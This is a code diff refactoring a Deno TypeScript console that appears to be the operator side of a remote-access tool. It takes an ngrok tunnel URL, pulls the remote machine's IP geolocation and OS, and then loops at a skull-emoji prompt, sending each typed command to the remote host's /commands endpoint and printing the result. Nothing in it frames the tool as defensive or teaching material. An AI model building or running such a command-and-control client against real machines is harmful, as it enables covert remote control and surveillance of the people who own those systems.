@@ -1,29 +1,55 @@
-import * as ink from "https://deno.land/x/ink/mod.ts";
+import * as ink from "https://deno.land/x/ink@1.3/mod.ts";
 
-console.log(await Deno.readTextFile("welcome.txt"))
-console.log("version 0.0.1")
-console.log("Type ctrl + c to exit")
-const url: string | null = prompt("enter the ngrok url (without / at the end):")!;
-if (!url || url.length === 0) {
-  console.log("put the url!");
-} else {
-  const getIp = await fetch(`${url}/ip`, { method: "GET" });
-  const ip = await getIp.json();
+interface IIp {
+  status: string,
+  country: string,
+  countryCode: string,
+  region: string,
+  regionName: string,
+  city: string,
+  zip: string,
+  lat: number,
+  lon: number,
+  timezone: string,
+  isp: string,
+  org: string,
+  as: string,
+  query: string
+}
 
-  const getOs = await fetch(`${url}/ip/os`, { method: "GET" });
-  const os = await getOs.text();
-  // Print the info
+(async function main() {
+  console.log(
+    " Type a url like this: https://026f-181-58-226-188.ngrok.io\n",
+    await Deno.readTextFile("welcome.txt") + "\n",
+    "Version: 0.0.1\n",
+    "Type <ctrl + c> to exit.\n"
+  );
 
-  console.log(ink.colorize("<blue>       connection info            </blue>"));
-  console.log(ink.colorize(`<yellow>       os: ${os}                  </yellow>`));
-  console.log(ink.colorize(`<magenta>       ip: ${ip.query}            </magenta>`));
-  console.log(ink.colorize(`<green>       country: ${ip.country}     </green>`));
-  console.log(ink.colorize(`<cyan>       city: ${ip.city}             </cyan>`));
+  const url: string | null = prompt("Enter the ngrok url:");
+
+
+  if (!url || url.length < 1)
+    return console.log("Put a valid URL!");
+
+
+  const getIp: Response = await fetch(`${url}/ip`, { method: "GET" }),
+    ip: IIp = await getIp.json();
+
+  const getOs: Response = await fetch(`${url}/ip/os`, { method: "GET" }),
+    os: string = await getOs.text();
+
+
+  console.log(
+    ink.colorize(" <blue>     Connection      </blue>\n"),
+    ink.colorize(`<cyan> City:     ${ip.city} </cyan>\n`),
+    ink.colorize(`<green> Country:  ${ip.country} </green>\n`),
+    ink.colorize(`<magenta> Ip:       ${ip.query} </magenta>\n`),
+    ink.colorize(`<yellow> Os:       ${os} </yellow>\n`)
+  );
 
   while (true) {
-    const input = prompt("💀>");
+    const input = prompt(" 💀 >");
 
-    // https://db10-181-58-226-188.ngrok.io
     const rawResponse = await fetch(`${url}/commands`, {
       method: "POST",
       headers: {
@@ -34,7 +60,9 @@ if (!url || url.length === 0) {
         command: input,
       }),
     });
-    const content = await rawResponse.json();
-    console.log(content);
+
+    console.log(
+      "\n" + await rawResponse.json()
+    )
   }
-}
+})()
